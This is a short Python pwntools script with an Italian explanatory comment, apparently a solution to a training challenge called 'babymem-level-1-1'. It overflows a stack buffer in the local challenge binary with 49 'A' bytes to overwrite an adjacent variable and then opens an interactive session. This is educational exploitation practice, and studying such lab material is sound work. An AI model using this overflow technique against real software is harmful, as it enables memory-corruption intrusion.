#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --
Per risolvere la challenge è necessario rendere una variabile all'interno dello stack diversa da zero,
per farlo bisogna calcolare la distanza tra il buffer e la variabile salvata nello stack (tramite gdb).
Una volta a conoscenza della distanza tra i due si invia un bytestream della lunghezza necessaria
a scrivere un valore qualsiasi, diverso da zero, nell'indirizzo dove è salvata la variabile.
Sostanzialmente si fa overflow del buffer per sovrascrivere anche la variabile.
-----------------------------
'''

context.log_level = 'CRITICAL'

elf = ELF('/challenge/babymem-level-1-1')
p = elf.process()

delta_len = 48 + 1
bytestream = b'A' * delta_len

p.sendline(f'{len(bytestream)}'.encode())
p.sendline(bytestream)
p.interactive()
